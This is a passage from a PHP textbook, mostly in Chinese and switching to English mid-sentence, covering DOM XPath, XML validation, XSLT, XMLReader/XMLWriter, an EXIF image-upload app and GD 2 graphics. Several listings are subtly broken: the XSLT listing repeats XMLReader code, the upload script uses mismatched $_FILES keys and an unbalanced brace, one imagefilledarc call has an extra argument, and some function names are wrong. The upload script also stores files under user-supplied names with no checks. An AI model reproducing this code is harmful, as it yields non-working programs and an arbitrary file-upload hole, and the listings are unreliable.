值得了解 DOM 扩展的 XPath 功能。其用法与 SimpleXML 略有不同：你首先将 XML 文件加载到 DOMDocument 对象中，然后创建一个新的 DomXPath 对象，并使用 query(XPath 表达式) 执行查询。

```php
<?php
$dom = new DOMDocument();
if ($dom->load("products.xml")) {
    $xpath = new DomXPath($dom);
    foreach ($xpath->query("*/*/title") as $title) {
        print $title->textContent . "<br />";
    }
}
?>
```

## 清单 29.12 使用 DOM 的 XPath (dom_XPath.php)

## DOM 与 SimpleXML

我们在 29.2.2 节中讨论了 DOM 和 SimpleXML 之间的转换。

## 类

DOM 扩展的 API 是完全面向对象的。文档本身是一个 DOMDocument 对象。还有用于节点的 DomNode、用于标签的带有所有方法和属性的 DomElement，以及更多。新的是，你可以向底层类添加功能。最简单的方法是编写继承自 DOMDocument 等类的自定义类。然后可以将其作为常见任务封装到方法中。

### 29.2.4 验证

验证是指检查 XML 文档的结构是否正确。如果你完全控制 XML 的外观，不一定需要对其进行验证。如果你指定了某个结构但不知道是否始终遵守，情况就不同了。在这种情况下，需要 DTD 或架构。

以下清单显示了带有（内部）DTD 的文档。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE products [
  <!ELEMENT products (product+)>
  <!ELEMENT product (title+, price+)>
  <!ELEMENT title (#PCDATA)>
  <!ELEMENT price (#PCDATA)>
  <!ATTLIST price currency CDATA #REQUIRED>
]>
<products>
<product>
  <title>Vacuum cleaner XY</title>
  <price currency="Euro">4.80</price>
</product>
<product>
  <title>Teapot AB</title>





<price currency="Euro">22.50</price>
</product>
</products>

## 代码清单 29.13 XML文档 ("products_dtd.xml")

DOM扩展还针对此提供验证——实际上，有三种验证类型：

- 针对已知的 DTD
- 针对 XSD
- 针对 RELAX NG，一种非常简单的结构描述语言，在实践中非常流行¹

PHP 为这三种各提供了一个单独的方法：

- validate() 针对 DOMDocument 对象中链接的 DTD 进行验证：
  `$dom->validate();`
- schemaValidate(filename) 针对指定为文件名的架构文件进行验证：
  `$dom->schemaValidate("schema.xsd");`
  使用 schemaValidateSource(String)，也可以针对指定为字符串的 XSD 文档进行验证。
- relaxNGValidate(filename) 针对 RELAX NG 文件进行验证：
  `$dom->relaxNGValidate("relax.rng");`
  同样也有对应方法 relaxNGValidateSource(String)，它针对字符串进行验证。

## 代码清单 29.14 针对 DTD 进行验证 ("validate.php")

```php
<?php
$dom = new DOMDocument();
if ($dom->load("products.dtd.xml")) {
    if ($dom->validate()) {
        print "Validation successful!";
    } else {
        print "Validation failed!";
    }
}
?>
```

¹ RELAX NG 的主页位于 www.relaxng.org。RELAX NG 与 OASIS 合作，被标准化为 ISO 标准。

![](img/ae7820c36e8f24c1623d26668b28e80e_811_0.png)

## 图 29.9 带有（故意引入的）错误的验证

### 29.2.5 XSLT

与 XML 文档一样，XSLT 文档也是一个 DOMDocument 对象。从 PHP 角度来看，XSLT 转换非常简单，包含以下步骤：

1. 首先加载 XML 文件和 XMLReader。

2. 然后启动 XSLT 处理器：

```php
$pro = new XSLTProcessor();
```

3. 现在导入 XSLT：

```php
$pro->importStylesheet($xsl);
```

使用 setProperty(Namespace, Name, Value) 可以为转换设置属性。

4. 使用 transformToDoc(DOM) 执行转换：

```php
$erg = $pro->transformToDoc($dom);
```

> 注意
> 或者，你可以使用 transformToXml(DOM) 生成 XML 字符串。或者，你可以使用 transformToUri(DOM, URI) 将 DOM 文档转换为流。

5. 最后，保存结果。在这里，这是以字符串形式完成的：

```php
print $erg->saveXML();
```

你也可以使用 DOM 扩展的其他方法，例如 save(File) 将转换后的文档保存到文件中。

以下脚本——类似于代码清单 29.5——将 products.xml XML 文档转换为 HTML 页面（参见图 29.10）。

```php
<?php
$xml = new XMLReader();
$xml->open("products.xml");

while ($xml->read()) {
    if ($xml->nodeType == XMLReader::ELEMENT) {
        if ($xml->localName == "title") {
            $xml->read();
            echo htmlspecialchars($xml->value) .
                "<br />";
        }
    }
}
?>
```

## 代码清单 29.15 XSLT ("xslt.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_812_0.png)

## 图 29.10 作为 HTML 表格的产品

## 29.3 XMLReader 和 XMLWriter

XMLReader 和 XMLWriter 是新的 XML 访问变体，模仿了 Microsoft .NET Framework 中的 XmlReader 和 XmlWriter。它们与通过 SAX 访问类似，但使用更简单。

> **Note**
> 自 PHP 5.1 起，XMLReader 和 XMLWriter 已直接集成到 PHP 内核中。

### 29.3.1 XMLReader

与基于事件的 SAX 解析器不同，XMLReader 具有光标导向的解析器，这从读取文件中很常见。这意味着 XML 元素会逐个遍历。然后可以通过各种属性获取相应元素的更详细信息。诸如 XMLREADER::ELEMENT 之类的常量确定元素的类型（标签、文本等）。完整概览可见 http://s-prs.co/v602242。

与 DOM 解析器相比的优势显而易见：无需将整个文档存储在内存中。与 SAX 解析器相比，XMLReader 使用起来稍微简单一些，性能也略好。此外，目前还允许针对 RELAX NG 使用命名空间和验证。

以下清单显示了一个简单示例，它遍历 XML 文件并输出 `<title>` 标签内的所有值（参见图 29.11）。

```php
<?php
$xml = new XMLReader();
$xml->open("products.xml");

while ($xml->read())
{
if ($xml->nodeType == XMLReader::ELEMENT) {
if ($xml->localName == "title") {
$xml->read();
echo htmlspecialchars($xml->value) .
"<br />";
}
}
}
?>
```

## 代码清单 29.16 使用中的 XMLReader ("xmlreader.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_813_0.png)

## 图 29.11 读取两个产品的标题

### 29.3.2 XMLWriter

XMLWriter 是 XMLReader 的对照对象。它编写 XML 文档，并以严格的层级方式进行，与读取器一样。每个元素被启动（xmlwriter_start_element()）并结束（xmlwriter_end_element()）。它可以以函数导向和面向对象两种方式使用。代码清单 29.17 显示了函数导向访问的示例，结果如图 29.12 所示。

```php
<?php
$xmlwr = xmlwriter_open_memory();
xmlwriter_set_indent($xmlwr, true);
xmlwriter_start_document($xmlwr);
xmlwriter_start_element($xmlwr, "products");
xmlwriter_start_element($xmlwr, "product");
xmlwriter_start_element($xmlwr, "title");
xmlwriter_text($xmlwr, "Vacuum cleaner XY");
xmlwriter_end_element($xmlwr);
xmlwriter_start_element($xmlwr, "price");
xmlwriter_write_attribute($xmlwr, "currency", "Euro");
xmlwriter_text($xmlwr, "4,80");
xmlwriter_end_element($xmlwr);
xmlwriter_end_element($xmlwr);
xmlwriter_end_element($xmlwr);
xmlwriter_end_document($xmlwr);
echo htmlspecialchars(xmlwriter_output_memory($xmlwr));
?>
```

## 代码清单 29.17 使用中的 XMLWriter ("xmlwriter.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_814_0.png)

## 图 29.12 XMLWriter 在此输出 XML 文件

代码清单 29.18 显示了相同的示例，但采用面向对象的表示法。

```php
<?php
$xmlwr = new XMLWriter();
$xmlwr->openMemory();
$xmlwr->startDocument('1.0', 'UTF-8');
$xmlwr->setIndent(true);
$xmlwr->startDocument();
$xmlwr->startElement('products');
$xmlwr->startElement('product');
$xmlwr->startElement('title');
$xmlwr->text('Vacuum cleaner XY');
$xmlwr->endElement();
$xmlwr->startElement('price');
$xmlwr->writeAttribute('currency', 'Euro');
$xmlwr->text('4,80');
$xmlwr->endElement();
$xmlwr->endElement();
$xmlwr->endElement();
$xmlwr->endDocument();
echo htmlspecialchars($xmlwr->outputMemory());
?>
```

## 代码清单 29.18 XMLWriter: 面向对象 ("xmlwriter_oo.php")

## 29.4 EXIF

XML 有成千上万的应用示例。原则上，无论在哪里需要存储和交换数据，都会使用 XML。在本节中，XML 用于存储图像信息。数码相机的元信息存储在可交换图像文件格式（EXIF）中。2

我们的应用程序应允许用户上传图像。然后读取其部分 EXIF 数据并将其打包到 XML 文件中。第二个脚本访问 XML 文件并读取数据的一小部分。

### 29.4.1 准备工作

为了让 PHP 访问 EXIF 数据，你需要相应的扩展。在 Linux 下，使用 --enable-exif 配置 PHP。在 Windows 下，只需通过删除分号来注释掉以下行：

```
extension=php_exif.dll
```

2 EXIF 是一种存储有关相机、照片和拍摄参数信息的标准。但是，还有许多其他元数据格式，例如 Adobe 的可扩展元数据平台（XMP），它们部分基于 XML。

你可能仍需要激活 extension=php_mbstring.dll，并在调用 php_exif.dll 之前调用它。

### 29.4.2 实现

该应用程序由两个脚本组成：upload.php 脚本将图像上传到服务器，读取 EXIF 数据并将其保存在 XML 文件中。read.php 文件从 XML 文件和硬盘中检索 EXIF 数据和图像。

文件上传后，临时文件³ 使用 move_uploaded_file(origin, destination) 方法从原始存储位置复制到目标位置。图像应与用户计算机上的名称相同。该文件最终位于 images 子文件夹中：

```php
if (isset($_FILES["File"])) {
   move_uploaded_file($_FILES["File"]["tmp_name"], "./images/" .
   $_FILES["File"]["name"]);
}
```

> **Note**
> 
> 你可能需要检查是否已存在同名文件。如果你的管理系统有多个用户，那么每个用户都需要自己的目录。你还应该检查图像的大小并设置相应的限制。

下一步是读取 EXIF 数据。为此使用 exif_read_data(Image, Required, Array, Thumbnail) 方法。你将图像名称作为参数指定。随后是一个字符串，其中包含必须存在的 EXIF 信息部分，才能读取图像的 EXIF 头部。⁴ 第三个参数控制是否将 EXIF 数据作为数组返回；第四个参数确定是否也应传输缩略图，⁵ 缩略图通常存在于 EXIF 头部中：

其余部分则是 DOM 工作。如果文件尚不存在，则会创建新文档并写入根元素。随后是图像标签，它应包含刚刚上传图像的信息。各个 EXIF 信息由 foreach 循环提供。以下是针对文件信息的处理示例：



```php
$file = $dom->createElement("file");
$image->appendChild($file);
foreach ($data["FILE"] as $index => $value) {
    if (is_string($value)) {
        $value = serialize($value);
    }
    $index = $dom->createElement(strtolower($index));
    $value = $dom->createTextNode($value);
    $index->appendChild($value);
    $file->appendChild($index);
}
```

对 EXIF 和 IFD0 信息重复此过程，然后保存 XML 文件。完整代码可参见下一个清单。

```html
<html>
<head>
    <title>File upload</title>
</head>
<body>
<?php
    if (isset($_FILES["file"])) {
        move_uploaded_file($_FILES["File"]["tmp_name"], "./images/" .
            $_FILES["Datei"]["name"]);
    }
    $data = exif_read_data("./images/" . $_FILES["File"]["name"],
        "File, EXIF, IFD0", true, false);

//XML document
$dom = new DOMDocument();
if (!@$dom->load("images.xml")) {
    $images = $dom->createElement("images");
    $dom->appendChild($images);
}
$image = $dom->createElement("image");
$dom->documentElement->appendChild($image);

//File data
$file = $dom->createElement("file");
$image->appendChild($file);

foreach ($data["FILE"] as $index => $value) {
    if (!is_string($value)) {
        $value = serialize($value);
    }
    $index = $dom->createElement(strtolower($index));
    $value = $dom->createTextNode($value);
    $index->appendChild($value);
    $file->appendChild($index);
}

//EXIF data
$exif = $dom->createElement("exif");
$image->appendChild($exif);

foreach ($data["EXIF"] as $index => $value) {
    if (!is_string($value)) {
        $value = serialize($value);
    }

    $index = $dom->createElement(strtolower($index));
    $value = $dom->createTextNode($value);
    $index->appendChild($value);
    $exif->appendChild($index);
}

//IFD0 data
$ifd0 = $dom->createElement("ifd0");
$image->appendChild($ifd0);

foreach ($data["IFD0"] as $index => $value) {
    if (!is_string($value)) {
        $value = serialize($value);
    }

    $index = $dom->createElement(strtolower($index));
    $value = $dom->createTextNode($value);
    $index->appendChild($value);
    $ifd0->appendChild($index);
}

$dom->save("images.xml");
}
?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="File" />
    <input type="submit" value="Upload" />
</form>
</body>
</html>
```

### 清单 29.19 图片上传 ("upload.php")

下一个清单包含从 XML 文件读取一些信息的脚本。
在输出中，我们使用 SimpleXML 而不是 SAX，因为这种方法需要的代码要少得多。

```php
<?php
$sim = simplexml_load_file("images.xml");
foreach ($sim->image as $image) {
print '<table border="1" cellpadding="5">';
//filename
print '<tr><td>';
print 'File:';
print '</td><td>';
print $image->file->filename;
print '</td></tr>';
//Date of the recording
print '<tr><td>';
print 'Date of recording';
print '</td><td>';
print $image->exif->datetimeoriginal;
print '</td></tr>';
//image
print '<tr><td colspan="2">';
print '<img src="';
print './images/' . $image->file->filename;
print '"/></td></tr>';
print '</table>';
}
?>
```

### 清单 29.20 使用 SimpleXML 进行读取 ("read.php")

图 29.13 显示了结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_819_0.png)

### 图 29.13 图片连同原始 EXIF 信息一起输出

### 提示

改进潜力巨大：您可以更精美地格式化输出、捕获异常，并更广泛地使用 EXIF 信息。从在线图像编辑到图像画廊，一切皆有可能。

# 第 30 章

# 用 PHP 绘制图形

PHP 并非 Photoshop 或 GIMP；这一点很明确。尽管如此，使用 PHP，您至少可以动态生成简单的图形。

一些应用表明，动态生成图形非常有吸引力：只需想想带有漂亮字体的个性化问候语或简单的动态生成图表即可。图形也用于安全机制：例如，用户需要输入数字或文本的图形生成验证码可以防止登录被不断尝试破解。

在 PHP 中，为此使用 GD（版本）2。一个名为 PIMP 的替代项目也讨论了很长时间，但从未完成。因此，本章详细介绍了 GD 2，然后简要讨论替代方案，例如 ImageMagick。

## 30.1 准备工作

GD 2 不需要太多准备工作。您只需将该库集成到 PHP 中即可。

### 30.1.1 安装

在 Linux 下安装 GD 并不容易。首先从 https://github.com/libgd/libgd/releases 下载 GD。对于 JPEG 支持，您还需要 JPEG 库 (www.ijg.org)，必须将其编译进 GD。对于 TrueType 字体支持，您需要 ZLIB、FreeType 和 XPM。然后使用以下选项配置 PHP：

```
--with-gd --enable-gd-native-ttf --with-png --with-zlib-dir=/usr/local/lib/zlib-1.2.1 --with-ttf --with-jpeg-dir=/usr/local/lib/jpeg-6b --with-freetype-dir=/usr/local/lib/freetype-2.1.9 --with-xpm-dir=/usr/X11R6/
```

相比之下，在 Windows 下安装非常简单。只需通过删除分号来注释掉以下行：

```
extension=php_gd2.dll;
```

从 PHP 7.2 开始，这也可以在没有 php_ 和 .dll 的情况下工作：

```
extension=gd2
```

在许多带有主机的安装和标准包中，该行已经被注释掉，GD 2 已内置。然后可以使用 phpinfo() 测试安装是否成功。JPEG 和 TrueType 字体支持已包含在内。

## 30.2 GD 2 实战

Thomas Boutell 开发的 GD 2 并非专门为 PHP 编写，但它已被许多 PHP 开发者使用。它提供绘制形状和文本的选项，还允许修改现有图像。

### 30.2.1 基本框架

使用 GD 2 创建图形时，该图形是一个 PHP 文件。基本结构始终相同。首先，必须通过 HTTP 标头输出数据类型：

```
header("Content-type: image/png");
```

Content-type 是图像的文件类型。您有以下选项：

```
header("Content-type: image/gif");
```

用于 GIF，或者

```
header("Content-type: image/jpeg");
```

用于 JPEG。

> **注意**
> 
> GIF 仅支持 256 种颜色，所有颜色均收集在调色板中。由于其面向区域的压缩算法，GIF 主要适用于按钮等平面图形，并提供透明度和 GIF 动画等特殊功能。JPEG 使用 1678 万种颜色，适用于照片。但是，JPEG 使用有损压缩，如果压缩过强，最终会导致难看的像素化效果，称为 JPEG 伪迹。
> 
> PNG 作为这两种格式的替代方案而开发：PNG-8（及更低版本）存储 256 种颜色，而 PNG-24 支持 1678 万种颜色。PNG-8 支持简单透明度。使用 PNG-24 时，文件通常比 JPEG 稍大，但它们无损压缩，并且与 PNG-8 和 JPEG 不同，Alpha 透明度有助于创建漂亮的效果。Alpha 透明度意味着像素也可以半透明，从而实现与背景的平滑过渡。

现在您需要创建图像。为此，请使用 imagecreatetruecolor(width, height) 函数：

```
$image = imagecreatetruecolor(200, 200);
```

真彩色图像支持 1678 万种颜色。如果要创建 GIF 或 PNG-8，
请改用 `imagecreate(width, height)`：

```
imagecreate(200, 200);
```

> 注意
> 
> GD 2 没有面向对象的 API；它基于函数。这是 PHP 曾考虑替代标准库的原因之一。但是在 PHP 8 中，GD 资源也被名为 GDImage 的类取代，作为将“旧”资源转换的一部分。在 PHP 8.1 中，字体资源也通过 GDFont 类完成了此操作。

接下来是图像的内容。这些内容将在下一节中介绍。
图像的输出方式对于基本结构也很重要。这根据文件类型使用不同方法完成：

```
imagepng($image);
```

创建 PNG，

```
imagegif($image);
```

GIF，以及

```
imagejpeg($image);
```

JPEG。

最后，应将图像从内存中删除，以免携带任何遗留数据：

```
imagedestroy($image);
```

如果现在在浏览器中查看图像，您会看到一个黑色区域，而不是您可能期望的白色（参见图 30.1）。背景已被 GD 自动填充为黑色。如果您未指定颜色，绘图时也会使用黑色作为默认颜色。

要获得不同的背景颜色，必须先使用相应颜色的矩形填充图像。为此，请使用 `imagecolorallocate(image, R, G, B)` 定义颜色，然后使用 `imagefilledrectangle(image, x1, y1, x2, y2, color)` 绘制矩形：

```
$white = imagecolorallocate($image, 255, 255, 255);
imagefilledrectangle($image, 0, 0, 199, 199, $white);
```





![](img/ae7820c36e8f24c1623d26668b28e80e_824_0.png)

图 30.1 黑色归来，背景的基本颜色 ...

您可以在图 30.2 中看到结果。坐标是矩形的左上角和右下角。

![](img/ae7820c36e8f24c1623d26668b28e80e_824_1.png)

图 30.2 ... 以及回归白色 ("basic.php")

### 30.2.2 文本

GD 中的文本本身很简单，但字体的选择和字体的外观有时会成为问题。imagestring(image, font, x, y, text, color) 函数允许您在图像中写入文本（参见图 30.3）。除了字体外，所有设置都不言自明。此处您指定一个标准 GD 字体。标准字体的编号为 1 到 5。

```php
<?php
header("Content-type:image/png");

$image = imagecreatetruecolor(200, 200);

$white = imagecolorallocate($image, 255, 255, 255);
imagefilledrectangle($image, 0, 0, 199, 199, $white);
$blue = imagecolorallocate($image, 51, 51, 204);
$text = "GD 2 is great!";
imagestring($image, 5, 50, 50, $text, $blue);

imagepng($image);
imagedestroy($image);
?>
```

清单 30.1 "imagestring()" ("text.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_825_0.png)

图 30.3 GD 的文本版本

> **提示**
> 使用 imagestringup()，您可以绘制垂直文本。x 和 y 坐标也代表文本的左上角。

文本输出的问题是标准字体的外观和大小是固定的。因此，使用 imagestring() 时，您默认只有这些字体可用。

现在您可以使用 imageloadfont(Font) 函数加载新字体。该函数返回一个整数，即字体编号：

```php
$font = imageloadfont("xy.gdf");
$blue = imagecolorallocate($image, 51, 51, 204);
$text = "GD 2 is great!";
imagestring($image, $font, 50, 50, $text, $blue);
```

这也能很好地工作。但是，此函数需要 GDF 字体。例如，您可以在 www.danceswithferrets.org/lab/qdffs 上找到一些。

如果您想更自由地定义字体，也可以使用 GD 通过 imagettftext(image, size, angle, x, y, color, font, text) 函数创建 TrueType 字体 (TTF)。以下清单显示了一个示例；输出如图 30.4 所示。

```php
$blue = imagecolorallocate($image, 51, 51, 204);
$text = "GD 2 is great!";
imagettftext($image, 14, 0, 50, 50, $blue, "times.ttf", $text);
```

清单 30.2 "imagettftext()" (摘自 "text_ttf.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_826_0.png)

图 30.4 Times 字体的文本输出

> **提示**
> imagettftext() 函数返回文本框的尺寸。提供的数组由从左上角开始的四个坐标（x 和 y 值）组成。如果您只想测量文本而不输出它，也可以使用 imagettfbbox(size, angle, font, text)。

### 30.2.3 形状

GD 通过多个函数提供几何形状：

- imagefilledrectangle(image, x1, y1, x2, y2, color) 绘制填充矩形。
- imagefilledellipse(image, cx, cy, rx, ry, color) 创建填充椭圆或水平和垂直半径相同（rx 和 ry）的圆。cx 和 cy 指定圆的中心。
- imagefilledpolygon(image, points, number of points, color) 填充多边形。Points 是一个包含坐标的数组。
- imagefilledarc(image, cx, cy, width, height, start angle, end angle, color, style) 填充弧。例如，您可以使用此函数创建饼图。使用 cx 和 cy 指定弧围绕其旋转的圆的中心。Width 和 height 是整个圆的宽度和高度。Start angle 和 end angle 定义起始和结束角度。

> **注意**
>
> 这四个函数也都有不带 filled 的版本。此时，您只绘制边框——例如，imageellipse(image, cx, cy, rx, ry, frame color)。

清单 30.3 显示了一个矩形和椭圆的示例，图 30.5 显示了结果。

```php
<?php
header("Content-type:image/png");

$image = imagecreatetruecolor(200, 200);

$white = imagecolorallocate($image, 255, 255, 255);
imagefilledrectangle($image, 0, 0, 199, 199, $white);

$blue = imagecolorallocate($image, 51, 51, 204);
imagefilledrectangle($image, 50, 50, 150, 150, $blue);

$red = imagecolorallocate($image, 204, 51, 51);
imagefilledellipse($image, 100, 100, 50, 50, $red);

imagepng($image);
imagedestroy($image);
?>
```

清单 30.3 简单图形 ("forms.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_828_0.png)

图 30.5 矩形上的圆：一件艺术品？

弧需要几个额外参数，之后您将得到一个饼图，如图 30.6 所示。

```php
$white = imagecolorallocate($image, 255, 255, 255);
imagefilledrectangle($image, 0, 0, 199, 199, $white);

$red = imagecolorallocate($image, 204, 51, 51);
imagefilledarc($image, 100, 100, 150, 150, 0, 180, $red, IMG_ARC_PIE);
$blue = imagecolorallocate($image, 51, 51, 204);
imagefilledarc($image, 100, 100, 150, 150, 180, 260, $blue, IMG_ARC_PIE);

$green = imagecolorallocate($image, 51, 204, 51);
imagefilledarc($image, 100, 100, 100, 150, 150, 260, 360, $green, IMG_ARC_PIE);
```

清单 30.4 饼图 (摘自 "imagefilledarc.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_828_1.png)

图 30.6 饼图

### 30.2.4 线条和样式

使用 imageline(image, x1, y1, x2, y2, color) 可绘制线条。使用此函数和所有其他用于绘制线条的函数（imageellipse()、imagerectangle() 等），您可以预先设置线条样式。在 imagelinestyle(image, style) 函数中，style 参数是一个数组，其元素代表线条的各个像素。每个元素包含一种颜色。要使用样式，只需将 IMG_COLOR_STYLED 常量作为颜色输入即可。

第二个相关函数是 imagesetthickness(image, thickness)，它将所有线条的粗细设置为像素。顺便说一句，默认值为 1。您无需在绘图函数中专门指定粗细。它从脚本中出现该语句的位置开始生效。

以下清单显示了一个简单示例，我们使用线条绘制了一个红、蓝、白虚线 W（参见图 30.7）。

```php
imagesetthickness($image, 20);
$red = imagecolorallocate($image, 204, 51, 51);
$blue = imagecolorallocate($image, 51, 51, 204);
imagesetstyle($image, array($red, $red, $blue, $blue, $white, $white));
imageline($image, 0, 0, 50, 199, IMG_COLOR_STYLED);
imageline($image, 50, 199, 100, 0, IMG_COLOR_STYLED);
imageline($image, 100, 0, 150, 199, IMG_COLOR_STYLED);
imageline($image, 150, 199, 200, 0, IMG_COLOR_STYLED);
```

清单 30.5 线条及其样式 ("lines.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_829_0.png)

图 30.7 单独的线条样式

> **提示**
> 使用 imagesetbrush(image, brush) 方法，您甚至可以使用另一张图像作为线条的样式。为此，您必须像往常一样加载图像（例如，使用 imagecreatefrompng()），然后将其作为第二个参数传递给 imagesetbrush() 函数。要使用画笔，只需将 IMG_COLOR_STYLEDBRUSHED 颜色常量作为颜色指定即可。

### 30.2.5 图像输出

如果您想在网站上使用动态创建的文件，可以使用普通的 img 标签：

```
<img src="script.php" />
```

就这样。图像将出现在浏览器中。

如果要在服务器上保存图像而不是在浏览器中显示，请使用 imagepng()、imagejpeg() 和 imagegif() 函数。只需使用带文件名的第二个参数：

```
imagepng($image, "test.tif");
```

也可以使用 ob_start() 等输出缓冲区通过 PHP 输出图像。此处也可以使用 Stream_Var PEAR 类。

### 30.2.6 图像处理

让我们谈谈编辑现有图像。您可以使用相应的 imagecreatefromXY(file name) 函数打开现有图像，其中 XY 代表文件格式。

现在，您可以将文本或形状等新元素绘制到现有图像中。这与前几节中描述的过程无异。但是，图像编辑是指更改图像本身。为此有两种方法：

- 1. 对于具有 256 种颜色和调色板的图像，您可以交换调色板中的颜色。
- 2. 对于具有 1678 万种颜色的图像，您必须逐个更改每个像素。

我们将以灰度转换为例向您展示这两种变体。首先，在下一节中，我们将讨论如何减小现有图像的大小。

### 减小图像大小

如果您想更改图像的大小，可以使用 imagecopyresized(target, source, zx, zy, qx, qy, Z-width, Z-height, Q-width, Q-height) 函数。您指定



the target image and the source, then the coordinates at which the image section starts in each case, followed by the width and height of the target and source.

The following example reduces an image to 10% of its original size, as shown in Figure 30.8 and Figure 30.9.

```
<?php
header("Content-type:image/jpeg");

$image = imagecreatefromjpeg("test.jpg");
$x = imagesx($image);
$y = imagesy($image);

$image_smaller = imagecreatetruecolor($x * 0.2, $y * 0.2);

imagecopyresized($image_smaller, $image, 0, 0, 0, 0, $x * 0.2, $y * 0.2, $x,
$y);

imagejpeg($image_smaller);
imagedestroy($image);
imagedestroy($image_smaller);
?>
```

**Listing 30.6 Reducing the Size of an Image ("image_reduce.php")**

![](img/ae7820c36e8f24c1623d26668b28e80e_831_0.png)

Figure 30.8 From Large...

![](img/ae7820c36e8f24c1623d26668b28e80e_832_0.png)

Figure 30.9 ...To Small

> **Note**
> Remember to delete both images from the memory at the end for the sake of order.

## Grayscale with 256 Colors

The simplest method for calculating a grey value is to add the individual color values of red, green, and blue that make up a color and divide by three. This average value is then the value for red, green, and blue in the grayscale. It is somewhat more subtle to give different colors different weights—for example, 25% red, 40% blue, and 35% green.

So much for the theory. In practice, all you have to do now is go through all the colors in the image. We will show you how using an example:

- 1. First load the image with the 256 colors:
  `$image = imagecreatefromgif("test.gif");`
- 2. Then loop through all the colors in the image. You get the total number with the `imagecolorstotal()` function:
  `for ($i=0; $i<imagecolorstotal($image); $i++) {`
- 3. Each color has an index, which is mapped here with the `$i` loop variable. `imagecolorsforindex(image, index)` returns the color value of a color as an associative array:
  `$f = imagecolorsforindex($image, $i);`
- 4. You can access the individual colors in this array with the red, green, and blue keys. These are the basis of the formula for the grayscale calculation:
  ```
  $gst = $f["red"]*0.25 + $f["green"]*0.4 + $f["blue"]*0.35;
  ```
- 5. To redefine the color as grayscale, use the calculated grayscale values for red, green, and blue:
  ```
  imagecolorset( $image, $i, $gst, $gst, $gst );
  }
  ```
- 6. Finally, simply output the image.

The following listing shows the complete code.

```
<?php
header("Content-type:image/png");

$image = imagecreatefromgif("test.gif");

for ($i=0; $i<imagecolorstotal($image); $i++) {
$f = imagecolorsforindex($image, $i);
$gst = $f["red"]*0.25 + $f["green"]*0.4 + $f["blue"]*0.35;
imagecolorset( $image, $i, $gst, $gst, $gst );
}
imagepng($image);
imagedestroy($image);
?>
```

**Listing 30.7 Grayscale Conversion of 256 Colors ("grayscale_256.php")**

> **Note**
> 
> By the way, when you specify a color, you can also specify the transparency. This is done using the imagecolorallocatealpha(image, red, green, blue, alpha) function with an alpha value from 0 to 127. There are also other functions for images with a color palette to determine colors: imagecolorclosest() and imagecolorclosestalpha() use the color from the palette that is closest to the specified color value. To specify a transparent color in GIF and PNG-8 formats, use imagecolortransparent(image, color).

## Grayscale with 16.78 Million Colors

If you want to convert a photo with more than 256 colors to grayscale, you actually have to replace every pixel. However, as this eats up performance, we will show you a trick.

The trick is to compress the colors of the image into a 256-color palette using the imagetruecolortopalette(image, dithering, number of colors) function. 1 The disadvantage of this method is that color information is lost. On the other hand, the conversion to grayscale is quick and easy.

> 1 Dithering means that color values are simulated by similar surrounding colors. As an example, assume that a 2 × 2 pixel square consists entirely of four orange pixels. When converting to 256 colors, however, there is no more orange, which is why two of the four pixels are replaced with red and two with yellow. This visually simulates the effect of orange, but it makes the image appear more pixelated. If, on the other hand, the dithering is omitted, then the image becomes more graduated.

```
<?php
header("Content-type:image/jpeg");

$image = imagecreatefromjpeg("test.jpg");
imagetruecolortopalette($image, false, 256);

for ($i=0; $i<imagecolorstotal($image); $i++) {
$f = imagecolorsforindex($image, $i);
$gst = $f["red"]*0.15 + $f["green"]*0.5 + $f["blue"]*0.35;
imagecolorset( $image, $i, $gst, $gst, $gst );
}

imagejpeg($image);
imagedestroy($image);
?>
```

**Listing 30.8 Conversion with Previous Palette Adjustment ("grayscale_1678_conversion.php")**

The next step is the exact conversion to grayscale. The most important elements are two nested loops that go through the width and height of the image pixel by pixel. The color is also determined a little differently. The colorat(image, x, y) function returns the color of a coordinate, which you can then determine with imagecolorsforindex() and turn into a color array. Once the color value has been converted, color the pixel with the imagesetpixel(image, x, y, color) function.

```
<?php
header("Content-type:image/jpeg");

$image = imagecreatefromjpeg("test.jpg");

for ($i=0; $i<imagesx($image); $i++) {
for ($j=0; $j<imagesy($image); $j++) {
$f = imagecolorat($image, $i, $j);
$f = imagecolorsforindex($image, $f);
$gst = $f["red"]*0.25 + $f["green"]*0.4 + $f["blue"]*0.35;
$color = imagecolorallocate($image, $gst, $gst, $gst);
imagesetpixel($image, $i, $j, $color);
}
}
imagejpeg($image);
imagedestroy($image);
?>
```

**Listing 30.9 Less Performant ("grayscale_1678.php")**

> **Tip**
> There are also integrated image processing options in GD: With `imageconvolution()` you can change the image with a matrix and, for example, blur it. There are also some filters that you can apply with `imagefilter()`. Each filter is a constant, such as `IMG_FILTER_GAUSSIAN_BLUR` for the Gaussian blur:
> `imagefilter($image, IMG_FILTER_GAUSSIAN_BLUR);`
> Depending on the filter, further parameters are possible for the settings. You can find an overview at `http://s-prs.co/v602243`.

### 30.2.7 Dynamic Diagram

The aim of this section is to realize a pie chart dynamically from an XML file. The XML file has a very simple structure and contains a survey with the various answers:

```
<?xml version="1.0" encoding="UTF-8"?>
<question text="Who should be kicked out?">
<answer id="a" text="The coach">12</answer>
<answer id="b" text="The players">53</answer>
<answer id="c" text="The board">85</answer>
</question>
```

The script uses SimpleXML to read the data from the XML file. First, a foreach loop adds up the votes for all answers. This is later used to calculate the percentage of the individual answers. After the usual GD preparations, another loop follows that goes through all the answers. The percentage share is calculated for each answer. This results in the final angle for the respective arc:

```
$end = $start + 360 * intval($answer) / $ant_max;
```

`imagecolorallocate()` then draws the arc. We add the legend with `imagettftext()`. The response text comes directly from the XML file. Finally, the start angle is set to the last end angle. You can see the output in Figure 30.10.

```
<?php
$sim = simplexml_load_file("survey.xml");

//Determine total sum of answers
$ant_max = 0;
foreach ($sim->answer as $answer) {
  $ant_max += intval($answer);
}

header("Content-type:image/png");
$image = imagecreatetruecolor(350, 250);

$white = imagecolorallocate($image, 255, 255, 255);
imagefilledrectangle($image, 0, 0, 349, 249, $white);

$colors = array(imagecolorallocate($image, 204, 51, 51),
                imagecolorallocate($image, 51, 204, 51),
